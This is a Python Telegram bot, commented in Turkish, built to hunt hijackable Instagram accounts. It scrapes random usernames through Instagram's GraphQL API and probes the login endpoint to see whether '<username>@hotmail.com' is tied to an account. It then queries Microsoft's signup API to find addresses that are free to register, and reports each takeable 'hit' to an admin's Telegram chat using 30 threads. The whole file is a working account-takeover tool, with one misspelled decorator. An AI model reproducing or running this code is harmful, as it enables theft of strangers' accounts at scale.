import telebot
import requests
import random
import threading
import time
import re
from hashlib import md5
from random import randrange

# --- AYARLAR ---
TOKEN = "BURAYA_BOT_TOKEN_YAZ"
ADMIN_ID = "8258235296" # Sadece sana cevap vermesi için

bot = telebot.TeleBot(TOKEN)
hunting_active = False
hits = 0
checked = 0

# --- AVCI MOTORU ---
class HunterEngine:
    def __init__(self):
        self.session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
        self.session.mount('https://', adapter)
        self.setup_live()

    def setup_live(self):
        try:
            r = self.session.get('https://signup.live.com/signup', timeout=10)
            self.canary = re.search(r'"apiCanary":"(.*?)"', r.text).group(1).encode().decode('unicode_escape')
            self.amsc = r.cookies.get_dict()['amsc']
        except: self.setup_live()

    def get_user(self):
        try:
            headers = {'x-ig-app-id': '936619743392459', 'user-agent': 'Mozilla/5.0'}
            data = {'variables': '{"id":"'+str(randrange(1,999999999))+'","render_surface":"PROFILE"}', 'doc_id': '7663723823674585'}
            r = self.session.post('https://www.instagram.com/graphql/query', headers=headers, data=data, timeout=3)
            return r.json()['data']['user']['username']
        except: return None

    def attack(self):
        global hunting_active, hits, checked
        while hunting_active:
            user = self.get_user()
            if not user: continue
            
            email = f"{user}@hotmail.com"
            try:
                res = self.session.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', 
                                        data={'username': email}, 
                                        headers={'x-csrftoken': md5(str(time.time()).encode()).hexdigest(), 'user-agent': 'Mozilla/5.0'}, 
                                        timeout=3).text
                
                if 'showAccountRecoveryModal' in res or 'bad_password' in res:
                    m_res = self.session.post('https://signup.live.com/API/CheckAvailableSigninNames', 
                                             headers={'canary': self.canary}, cookies={'amsc': self.amsc}, 
                                             json={'signInName': email}, timeout=2).text
                    if '"isAvailable":true' in m_res:
                        hits += 1
                        bot.send_message(ADMIN_ID, f"🚀 **HİT YAKALANDI!**\n\n👤 User: `{user}`\n📧 Mail: `{email}`\n✅ Durum: Alınabilir!")
                
                checked += 1
            except: continue

# --- BOT KOMUTLARI ---
engine = HunterEngine()

@bot.message_message_handler(commands=['start'])
def welcome(message):
    if str(message.chat.id) != ADMIN_ID: return
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2)
    item1 = telebot.types.KeyboardButton('🚀 Avı Başlat')
    item2 = telebot.types.KeyboardButton('🛑 Durdur')
    item3 = telebot.types.KeyboardButton('📊 Durum')
    markup.add(item1, item2, item3)
    bot.reply_to(message, "👑 **Peker-V7 Bot Paneline Hoş Geldin Kralım!**\n\nAlttaki menüyü kullanarak sistemi yönetebilirsin.", reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def control(message):
    global hunting_active, hits, checked
    if str(message.chat.id) != ADMIN_ID: return

    if message.text == '🚀 Avı Başlat':
        if not hunting_active:
            hunting_active = True
            for _ in range(30): # Bot modu için 30 thread yeterli ve stabildir
                threading.Thread(target=engine.attack, daemon=True).start()
            bot.send_message(ADMIN_ID, "⚔️ **Av başladı!** Arka planda gerçek kullanıcılar taranıyor...")
        else:
            bot.send_message(ADMIN_ID, "⚠️ Sistem zaten çalışıyor.")

    elif message.text == '🛑 Durdur':
        hunting_active = False
        bot.send_message(ADMIN_ID, "🛑 Av durduruldu.")

    elif message.text == '📊 Durum':
        status = "🟢 Çalışıyor" if hunting_active else "🔴 Durduruldu"
        bot.send_message(ADMIN_ID, f"📈 **SİSTEM DURUMU**\n\nStatus: {status}\nChecked: {checked}\nHits: {hits}")

print("Bot başlatıldı sevgilim...")
bot.polling(none_stop=True)
￼Enter
